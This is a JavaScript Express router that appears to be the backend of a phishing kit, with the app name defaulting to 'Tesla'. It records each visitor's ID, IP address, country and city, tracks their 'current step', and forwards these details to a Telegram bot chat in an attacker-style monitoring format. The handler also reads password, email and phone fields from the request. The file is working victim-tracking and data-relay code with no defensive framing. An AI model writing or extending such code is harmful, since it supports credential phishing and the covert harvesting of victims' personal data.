import express from "express";
import axios from "axios";
import { getTelegramQueue } from "../utils/telegramQueue.js";
import { getMemoryStore } from "../utils/memory-store.js";

const router = express.Router();

/**
 * POST /api/send
 * Send general notification messages (like button clicks)
 */
router.post("/", async (req, res) => {
  try {
    const { Unik, Email, message, ip, country, city, name, Password, businessEmail, tel } = req.body;

    if (!Unik || !message) {
      return res.status(400).json({
        success: false,
        message: "Missing Unik or message",
      });
    }

    if (!process.env.BOT || !process.env.CHAT_ID) {
      return res.status(503).json({
        success: false,
        message: "Telegram bot not configured",
      });
    }

    // Get user data from memory store if not provided
    const userStore = getMemoryStore();
    const userData = userStore.get(Unik);
    
    const userIp = ip || userData?.ip || "N/A";
    const userCountry = country || userData?.data?.country || "XX";
    const userCity = city || userData?.data?.city || "Unknown";
    const appName = process.env.APP_NAME || "Tesla";

    // Format message in terminal style with all user data (monospace for clickable/copyable)
    const formattedMessage =
      `=============${appName}=============\n` +
      `ID: \`${Unik}\`\n` +
      `IP: \`${userIp}\`\n` +
      `Country: \`${userCountry}\`\n` +
      `City: \`${userCity}\`\n` +
      `==============================\n` +
      `Current Step: ${message}\n` +
      `==============================`;

    await axios.post(
      `https://api.telegram.org/bot${process.env.BOT}/sendMessage`,
      {
        chat_id: process.env.CHAT_ID,
        text: formattedMessage,
        parse_mode: "Markdown",
      },
      { timeout: 5000 }
    );

    console.log(`[SEND] Notification sent for user ${Unik}: ${message}`);

    return res.status(200).json({
      success: true,
      message: "Notification sent",
    });
  } catch (error) {
    console.error("Error in /api/send:", error.message);
    return res.status(500).json({
      success: false,
      message: error.message || "Internal server error",
    });
  }
});

router.post("/ip", async (req, res) => {
  try {
    const { id, ip, country, city, context } = req.body;

    // Store/update IP data in memory store
    const userStore = getMemoryStore();
    const existingUser = userStore.get(id);

    const ipData = {
      ip: ip,
      country: country || "Unknown",
      city: city || "Unknown",
    };

    if (existingUser) {
      // Update existing user with IP data
      existingUser.context = context;
      existingUser.data = { ...existingUser.data, ...ipData };
      existingUser.lastUpdated = new Date().toISOString();
      existingUser.lastActivity = Date.now();
      existingUser.ip = ip;
      userStore.set(id, existingUser);
      console.log(`Updated IP data for existing user ID: ${id}`);
    } else {
      // Create new user entry with IP data
      const newUser = {
        context: context,
        userId: id,
        data: ipData,
        connectedAt: new Date().toISOString(),
        lastUpdated: new Date().toISOString(),
        lastActivity: Date.now(),
        ip: ip,
      };
      userStore.set(id, newUser);
      console.log(`Created new user entry with IP data for ID: ${id}`);
    }

    // Feature flag: Only queue telegram notification if enabled
    let notificationQueued = false;
    if (process.env.Notification_On_Connect === "true") {
      const telegramQueue = getTelegramQueue();
      telegramQueue.enqueue({
        type: "ip",
        userId: id,
        data: {
          id: id,
          ip: ip,
          country: country || "Unknown",
          city: city || "Unknown",
          context: context,
        },
      });
      notificationQueued = true;
      console.log(`Telegram notification queued for IP event: ${id}`);
    } else {
      console.log(`Telegram notification skipped (feature disabled): ${id}`);
    }

    return res.status(200).json({
      success: true,
      message: "IP data stored successfully",
      notificationQueued: notificationQueued,
    });
  } catch (error) {
    console.error("Error in /api/send/ip:", error);
    return res.status(500).json({
      success: false,
      message: "Internal server error",
    });
  }
});

export default router;
